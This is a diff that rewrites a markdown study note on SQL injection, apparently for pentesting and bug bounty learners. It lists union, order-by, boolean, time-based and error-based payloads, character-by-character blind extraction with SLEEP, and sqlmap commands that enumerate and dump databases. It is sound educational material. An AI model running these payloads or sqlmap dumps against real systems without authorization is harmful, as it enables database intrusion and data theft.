@@ -1,37 +1,132 @@
-# SQL Injection
+## SQL Injection (SQLi) — Complete Overview
 
-- Basic enumeration or injection for SQL injection is to either manually test with payloads or else using tools such as SQLmap.
-- For the manual testing we can directly use UNION based attacks, ORDER BY attacks, etc. in order to find the database name, table name, column name.
-- For the automated tools we use SQLmap where here are the given steps to enumerate into the database and get the details required.
-	- `--dbs` : Database
-	- `-D [ DATABSE NAME ] --tables` : Tables for the given database
-	- `-D [ DATABASE ] -T [ TABLE ] --dump` : Lists the columns available as well as the data in the tables.
-- **BLIND SQL INJECTION**
-	- In Blind SQL Injection, we can use the given types of attacks to identify whether this vulnerability exists or not.
-		- **SUBSTRING BASED ATTACKS**
-			- You can craft a payload as : `SELECT substring(database(),1,1)` where it gives the first character of the database.
-			- We can try using it in a such a way as well in order to brute force the database name that if the first character is `a` then sleep(10) or else leave. In such way we can get the output.
-			- `SELECT if(substring(database(),1,1)='a',SLEEP(3),'a')`
-			- `SELECT if(substring(database(),1,1)>'g',SLEEP(3),'a')`
-		- **BOOLEAN BASED SQLi**
-			- `' AND 1=1 -- -`
-			- `' AND 1=2 -- -`
-			- Here 1=1 checks the condition to be true where as 1=2 as false thus the web application should respond to that accordingly.
-		- **TIME BASED SQLi**
-			- `SELECT SLEEP(10)`
-			- Here it checks the time after which the web application should respond. Thus if the application responds after 10s then it confirms Blind SQLi
-		- **ERROR BASED SQLi**
-			- ![image.png](../../assets/image_1737020823461_0.png)
-			- Here we are using CASE based statement to test the condition in the database, so if the condition becomes true then it responds back with an empty string but if the response is false then it responds with 'a'
-			- This can let us know about the existence of Blind SQLi.
-		- For much more reference use this link : https://www.db-fiddle.com/f/nLpyQDMd49iRygnY9H7CB8/5
+SQL Injection is one of the most common and critical web vulnerabilities where an attacker can interfere with the queries that an application makes to its database. It allows unauthorized access, data leakage, and in some cases, full system compromise.
 
-- **BLIND SQL INJECTION**
-	- For blind sql injection its not necessary that it will be only there in the URL, it can be there in SESSION TOKEN as well, or else Cookies as well.
-	- Like in one of the example of Portswigger lab, the Blind SQL injection was there in `TrackingId`.
-	- More best examples are there at the given link which will give you alot idea.
-- **NO SQL INJECTION**
-	- Its a very unique kind of SQLi where most used is MongoDB.
-	- Well in order to attack for this its a bit logical as well as easy.
-	- You can use the https://www.mongodb.com/ documentation
-	- Other than that the attack vector or parameter is directly where the details are to be entered which is `username` and `password`.
+---
+
+### Manual Testing for SQLi
+
+Manual SQLi is often tested through user input fields like search boxes, login forms, or URL parameters. Basic types of manual injections include:
+
+#### Union-Based Injection
+
+Used to fetch data from other tables via the `UNION` keyword.
+
+```sql
+' UNION SELECT 1,2,3-- -
+```
+
+#### Order By Injection
+
+Used to identify the number of columns.
+
+```sql
+' ORDER BY 1-- -
+' ORDER BY 2-- -
+...
+```
+
+Stop when the query breaks — that's your column count.
+
+---
+
+### Automated Testing Using SQLmap
+
+SQLmap is a powerful tool to automate SQL Injection detection and exploitation.
+
+#### Common Usage Patterns:
+
+```bash
+sqlmap -u "http://target.com/page.php?id=1" --dbs
+```
+
+* `--dbs`: Lists all available databases.
+* `-D [database] --tables`: Lists all tables in the specified database.
+* `-D [database] -T [table] --columns`: Lists all columns of the specified table.
+* `--dump`: Dumps data from the target database/table.
+
+---
+
+## Blind SQL Injection
+
+Blind SQLi occurs when there is no visible output, but the application’s behavior or response time reveals information.
+
+### 1. Substring-Based Blind SQLi
+
+Used for brute-forcing data character by character.
+
+```sql
+SELECT SUBSTRING(database(),1,1)
+```
+
+Condition-based delay injection:
+
+```sql
+SELECT IF(SUBSTRING(database(),1,1)='a', SLEEP(3), 'b')
+```
+
+Or for binary search approach:
+
+```sql
+SELECT IF(SUBSTRING(database(),1,1)>'m', SLEEP(3), 'a')
+```
+
+### 2. Boolean-Based Blind SQLi
+
+Observe true/false logic:
+
+```sql
+' AND 1=1-- -
+' AND 1=2-- -
+```
+
+Different response pages or content confirms injection.
+
+### 3. Time-Based Blind SQLi
+
+Check delay in server response:
+
+```sql
+' OR SLEEP(5)-- -
+```
+
+If the response is delayed, the application is likely vulnerable.
+
+### 4. Error-Based SQLi
+
+For databases configured to display SQL errors:
+
+```sql
+' OR 1=1 ORDER BY CASE WHEN (1=1) THEN NULL ELSE column_name END-- -
+```
+
+This triggers database errors and reveals backend structure.
+
+🔗 [Live SQLi Simulation Playground (DB Fiddle)](https://www.db-fiddle.com/f/nLpyQDMd49iRygnY9H7CB8/5)
+
+---
+
+## Where Can Blind SQLi Exist?
+
+* **URL Parameters**
+* **POST Data**
+* **Cookies (e.g., `TrackingId`)**
+* **Session Tokens**
+
+Example from PortSwigger labs demonstrates SQLi in `TrackingId` cookie — a good reminder to test beyond just URLs!
+
+---
+
+## Bug Bounty Tip:
+
+Even low-level SQLi vulnerabilities (like blind or in cookies) can fetch:
+
+* 🔒 **\$100 to \$500** on platforms like HackerOne and Bugcrowd.
+* 🔐 High CVSS ratings if it leads to data leakage or privilege escalation.
+
+---
+
+### 🔹 Real-world Examples:
+
+* [HackerOne Reports – SQLi](https://hackerone.com/hacktivity?filter=type%3Apublic&query=report_type%3A%22vulnerability%20report%22%20sql)
+* [HackerOne Reports – NoSQLi](https://hackerone.com/hacktivity?filter=type%3Apublic&query=nosql)
